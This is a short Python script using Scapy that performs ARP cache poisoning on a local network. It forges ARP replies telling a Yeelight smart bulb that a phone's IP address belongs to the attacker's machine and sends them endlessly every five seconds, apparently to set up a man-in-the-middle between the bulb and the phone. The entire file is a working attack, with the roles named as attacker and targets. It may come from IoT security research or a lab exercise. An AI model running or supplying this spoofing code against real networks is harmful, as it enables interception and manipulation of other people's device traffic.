from scapy.all import *

macAttacker = get_if_hwaddr(conf.iface) #"10:4a:7d:53:88:ba"
ipAttacker = get_if_addr(conf.iface)

ipPhone = "192.168.13.2"

macYeelight = "78:11:dc:aa:53:32"
ipYeelight = "192.168.13.1"

packet = ARP(op=2, pdst=ipYeelight, hwdst=macYeelight, psrc=ipPhone)
  
send(packet, inter = 5, count=-1, iface="wlp3s0")